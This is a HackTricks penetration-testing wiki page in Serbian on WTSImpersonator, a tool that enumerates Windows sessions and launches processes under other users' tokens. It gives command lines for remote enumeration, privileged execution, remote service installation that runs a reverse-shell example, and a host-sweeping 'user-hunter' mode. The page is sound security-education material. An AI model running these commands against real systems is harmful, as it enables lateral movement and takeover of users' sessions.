# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, čiji je autor Omri Baso, koristi Windows Terminal Services API-je izložene kroz RPC named pipe `\\pipe\LSM_API_service` kako bi enumerirao prijavljene sesije i pokrenuo proces sa tokenom izabranog korisnika. Podržava lokalnu enumeraciju i izvršavanje, kao i workflow-e zasnovane na udaljenom servisu.<sup>[[1]](#references)</sup>

## Osnovna funkcionalnost

Njegov tok lokalnog izvršavanja koristi sledeći niz API poziva:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Moduli i upotreba

- **Enumeracija korisnika:** Alat može da enumeriše sesije na lokalnom ili udaljenom hostu.

- Lokalno:
```bash
.\WTSImpersonator.exe -m enum
```
- Udaljeno, navedite IP adresu ili hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Izvršavanje komandi:** Moduli `exec` i `exec-remote` zahtevaju kontekst servisa. Microsoft navodi da `WTSQueryUserToken` zahteva da caller radi kao `LocalSystem` sa privilegijom `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

- Lokalno izvršavanje komande:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec može da pokrene komandni prompt kao `LocalSystem` radi testiranja:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Udaljeno izvršavanje komandi:** Udaljeni režim kreira servis na targetu u workflow-u sličnom PsExec-u i zato zahteva prava za instaliranje i pokretanje tog servisa.<sup>[[1]](#references)</sup>

- Primer:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Lov na korisnike:** Modul `user-hunter` pretražuje listu hostova u potrazi za sesijom navedenog korisnika i pokušava da izvrši prosleđeni program u tom kontekstu.<sup>[[1]](#references)</sup>
- Primer upotrebe:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: funkcija `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
